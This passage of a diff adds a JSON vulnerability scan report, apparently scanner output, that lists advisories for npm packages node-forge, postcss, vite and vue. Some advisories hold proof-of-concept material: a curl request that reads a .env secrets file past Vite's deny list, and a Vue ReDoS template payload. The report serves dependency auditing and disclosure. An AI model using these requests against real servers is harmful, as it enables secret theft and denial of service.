+                  "type": "PACKAGE",
+                  "url": "https://github.com/digitalbazaar/forge"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "node-forge has ASN.1 Unbounded Recursion"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5gfm-wpxj-wjgq/GHSA-5gfm-wpxj-wjgq.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "node-forge",
+                    "purl": "pkg:npm/node-forge"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.3.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-12816"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-436"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T22:07:19Z",
+                "nvd_published_at": "2025-11-25T20:15:58Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nCVE-2025-12816 has been reserved by CERT/CC\n\n**Description**\nAn Interpretation Conflict (CWE-436) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures to desynchronize schema validations, yielding a semantic divergence that may bypass downstream cryptographic verifications and security decisions.\n\n\n### Details\n\nA critical ASN.1 validation bypass vulnerability exists in the node-forge asn1.validate function within `forge/lib/asn1.js`. ASN.1 is a schema language that defines data structures, like the typed record schemas used in X.509, PKCS#7, PKCS#12, etc. DER (Distinguished Encoding Rules), a strict binary encoding of ASN.1, is what cryptographic code expects when verifying signatures, and the exact bytes and structure must match the schema used to compute and verify the signature. After deserializing DER, Forge uses static ASN.1 validation schemas to locate the signed data or public key, compute digests over the exact bytes required, and feed digest and signature fields into cryptographic primitives.\n\nThis vulnerability allows a specially crafted ASN.1 object to desynchronize the validator on optional boundaries, causing a malformed optional field to be semantically reinterpreted as the subsequent mandatory structure. This manifests as logic bypasses in cryptographic algorithms and protocols with optional security features (such as PKCS#12, where MACs are treated as absent) and semantic interpretation conflicts in strict protocols (such as X.509, where fields are read as the wrong type).\n\n### Impact\n\nThis flaw allows an attacker to desynchronize the validator, allowing critical components like digital signatures or integrity checks to be skipped or validated against attacker-controlled data.\n\nThis vulnerability impacts the `ans1.validate` function in `node-forge` before patched version `1.3.2`.\nhttps://github.com/digitalbazaar/forge/blob/main/lib/asn1.js.\n\nThe following components in `node-forge` are impacted.\n[lib/asn1.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153)\n[lib/x509.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667)\n[lib/pkcs12.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328)\n[lib/pkcs7.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90)\n[lib/rsa.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167)\n[lib/pbe.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363)\n[lib/ed25519.js](https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81)\n\nAny downstream application using these components is impacted.\n\nThese components may be leveraged by downstream applications in ways that enable full compromise of integrity, leading to potential availability and confidentiality compromises.",
+              "id": "GHSA-5gfm-wpxj-wjgq",
+              "modified": "2025-11-26T22:27:49.675787Z",
+              "published": "2025-11-26T22:07:19Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-5gfm-wpxj-wjgq"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/pull/1124"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/digitalbazaar/forge"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/asn1.js#L1153"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/ed25519.js#L81"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pbe.js#L363"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs12.js#L328"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/pkcs7.js#L90"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/rsa.js#L1167"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/blob/2bb97afb5058285ef09bcf1d04d6bd6b87cffd58/lib/x509.js#L667"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://kb.cert.org/vuls/id/521113"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.kb.cert.org/vuls/id/521113"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.npmjs.com/package/node-forge"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "node-forge has an Interpretation Conflict vulnerability via its ASN.1 Validator Desynchronization"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-65ch-62r8-g69g/GHSA-65ch-62r8-g69g.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "node-forge",
+                    "purl": "pkg:npm/node-forge"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.3.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-66030"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-190"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-26T22:07:44Z",
+                "nvd_published_at": "2025-11-26T23:15:49Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\n\n**MITRE-Formatted CVE Description**\nAn Integer Overflow (CWE-190) vulnerability in node-forge versions 1.3.1 and below enables remote, unauthenticated attackers to craft ASN.1 structures containing OIDs with oversized arcs. These arcs may be decoded as smaller, trusted OIDs due to 32-bit bitwise truncation, enabling the bypass of downstream OID-based security decisions.\n\n### Description\n\nAn ASN.1 OID Integer Truncation vulnerability exists in the node-forge `asn1.derToOid` function within `forge/lib/asn1.js`. OID components are decoded using JavaScript's bitwise left-shift operator (`\u003c\u003c`), which forcibly casts values to 32-bit signed integers. Consequently, if an attacker provides a mathematically unique, very large OID arc integer exceeding $2^{31}-1$, the value silently overflows and wraps around rather than throwing an error. \n\n### Impact\n\nThis vulnerability allows a specially crafted ASN.1 object to spoof an OID, where a malicious certificate with a massive, invalid OID is misinterpreted by the library as a trusted, standard OID, potentially bypassing security controls.\n\nThis vulnerability impacts the `asn1.derToOid` function in `node-forge` before patched version `1.3.2`. \n\nAny downstream application using this component is impacted. This component may be leveraged by downstream applications in ways that enables partial compromise of integrity, leading to potential availability and confidentiality compromises.",
+              "id": "GHSA-65ch-62r8-g69g",
+              "modified": "2025-12-01T16:20:43.190555Z",
+              "published": "2025-11-26T22:07:44Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-65ch-62r8-g69g"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66030"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/digitalbazaar/forge/commit/3e0c35ace169cfca529a3e547a7848dc7bf57fdb"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/digitalbazaar/forge"
+                }
+              ],
+              "related": [
+                "CGA-cg22-jx75-mw35",
+                "CGA-f3c2-2qm6-qc8r",
+                "CGA-mq2h-fhxf-v893"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "node-forge is vulnerable to ASN.1 OID Integer Truncation"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "postcss",
+            "version": "7.0.39",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-7fh5-64p2-3v2j"
+              ],
+              "aliases": [
+                "CVE-2023-44270",
+                "GHSA-7fh5-64p2-3v2j"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/09/GHSA-7fh5-64p2-3v2j/GHSA-7fh5-64p2-3v2j.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "postcss",
+                    "purl": "pkg:npm/postcss"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "8.4.31"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2023-44270"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-144",
+                  "CWE-74"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2023-10-03T15:04:58Z",
+                "nvd_published_at": "2023-09-29T22:15:11Z",
+                "severity": "MODERATE"
+              },
+              "details": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+              "id": "GHSA-7fh5-64p2-3v2j",
+              "modified": "2025-11-04T16:45:01Z",
+              "published": "2023-09-30T00:31:10Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44270"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/github/advisory-database/issues/2820"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/postcss/postcss"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/postcss/postcss/releases/tag/8.4.31"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "PostCSS line return parsing error"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "vite",
+            "version": "5.4.20",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-93m4-6634-74q7"
+              ],
+              "aliases": [
+                "CVE-2025-62522",
+                "GHSA-93m4-6634-74q7"
+              ],
+              "max_severity": "6.0"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.1.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.1.0"
+                        },
+                        {
+                          "fixed": "7.1.11"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.0.7",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0"
+                        },
+                        {
+                          "fixed": "7.0.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.4.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.0.0"
+                        },
+                        {
+                          "fixed": "6.4.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c 3.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.9.18"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c 4.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.2.9"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c 5.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.5.3"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 5.4.20",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "5.2.6"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-62522"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-10-20T19:54:28Z",
+                "nvd_published_at": "2025-10-20T20:15:37Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" \u003e .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n\u003cimg width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" /\u003e",
+              "id": "GHSA-93m4-6634-74q7",
+              "modified": "2025-10-21T14:51:26Z",
+              "published": "2025-10-20T19:54:28Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62522"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/vitejs/vite"
+                }
+              ],
+              "related": [
+                "CGA-947q-m6p4-3g23"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "vite allows server.fs.deny bypass via backslash on Windows"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "vite",
+            "version": "7.1.10",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-93m4-6634-74q7"
+              ],
+              "aliases": [
+                "CVE-2025-62522",
+                "GHSA-93m4-6634-74q7"
+              ],
+              "max_severity": "6.0"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.1.10",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.1.0"
+                        },
+                        {
+                          "fixed": "7.1.11"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 7.0.7",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "7.0.0"
+                        },
+                        {
+                          "fixed": "7.0.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 6.4.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "6.0.0"
+                        },
+                        {
+                          "fixed": "6.4.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c 3.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.9.18"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c 4.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.2.9"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c 5.0.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.5.3"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 5.4.20",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-93m4-6634-74q7/GHSA-93m4-6634-74q7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vite",
+                    "purl": "pkg:npm/vite"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "5.2.6"
+                        },
+                        {
+                          "fixed": "5.4.21"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-62522"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-22"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-10-20T19:54:28Z",
+                "nvd_published_at": "2025-10-20T20:15:37Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Summary\nFiles denied by [`server.fs.deny`](https://vitejs.dev/config/server-options.html#server-fs-deny) were sent if the URL ended with `\\` when the dev server is running on Windows.\n\n### Impact\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))\n- running the dev server on Windows\n\n### Details\n`server.fs.deny` can contain patterns matching against files (by default it includes `.env`, `.env.*`, `*.{crt,pem}` as such patterns). These patterns were able to bypass by using a back slash(`\\`). The root cause is that `fs.readFile('/foo.png/')` loads `/foo.png`.\n\n### PoC\n```shell\nnpm create vite@latest\ncd vite-project/\ncat \"secret\" \u003e .env\nnpm install\nnpm run dev\ncurl --request-target /.env\\ http://localhost:5173\n```\n\u003cimg width=\"1593\" height=\"616\" alt=\"image\" src=\"https://github.com/user-attachments/assets/36212f4e-1d3c-4686-b16f-16b35ca9e175\" /\u003e",
+              "id": "GHSA-93m4-6634-74q7",
+              "modified": "2025-10-21T14:51:26Z",
+              "published": "2025-10-20T19:54:28Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/vitejs/vite/security/advisories/GHSA-93m4-6634-74q7"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-62522"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/vitejs/vite/commit/f479cc57c425ed41ceb434fecebd63931b1ed4ed"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/vitejs/vite"
+                }
+              ],
+              "related": [
+                "CGA-947q-m6p4-3g23"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "vite allows server.fs.deny bypass via backslash on Windows"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "vue",
+            "version": "2.7.16",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5j4c-8p2g-v4jx"
+              ],
+              "aliases": [
+                "CVE-2024-9506",
+                "GHSA-5j4c-8p2g-v4jx"
+              ],
+              "max_severity": "3.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-5j4c-8p2g-v4jx/GHSA-5j4c-8p2g-v4jx.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "vue",
+                    "purl": "pkg:npm/vue"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0-alpha.1"
+                        },
+                        {
+                          "fixed": "3.0.0-alpha.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-9506"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-10-24T18:42:59Z",
+                "nvd_published_at": "2024-10-15T16:15:06Z",
+                "severity": "LOW"
+              },
+              "details": "The ReDoS can be exploited through the `parseHTML` function in the `html-parser.ts` file. This flaw allows attackers to slow down the application by providing specially crafted input that causes inefficient processing of regular expressions, leading to excessive resource consumption.\n\nTo demonstrate this vulnerability, here's an example. In a Vue client-side application, create a new Vue instance with a template string that includes a `\u003cscript\u003e` tag but closes it incorrectly with something like `\u003c/textarea\u003e`.\n\n```javascript\nnew Vue({\n  el: '#app',\n  template: '\n    \u003cdiv\u003e\n      Hello, world!\n      \u003cscript\u003e${'\u003c'.repeat(1000000)}\u003c/textarea\u003e\n    \u003c/div\u003e'\n});\n```\nNext, set up a basic HTML page (e.g., index.html) to load this JavaScript and mount the Vue instance:\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n  \u003ctitle\u003eMy first Vue app\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n  \u003cdiv id=\\\"app\\\"\u003eLoading...\u003c/div\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nWhen you visit the app in your browser at http://localhost:3000, you'll notice that the time taken to parse and mount the Vue application increases significantly due to the ReDoS vulnerability, demonstrating how the flaw can affect performance.",
+              "id": "GHSA-5j4c-8p2g-v4jx",
+              "modified": "2024-10-24T19:12:14.925352Z",
+              "published": "2024-10-15T18:30:50Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-9506"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/vuejs/core"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://www.herodevs.com/vulnerability-directory/cve-2024-9506"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "ReDoS vulnerability in vue package that is exploitable through inefficient regex evaluation in the parseHTML function"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "vue-template-compiler",
+            "version": "2.7.16",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-g3ch-rx76-35fx"
+              ],
+              "aliases": [
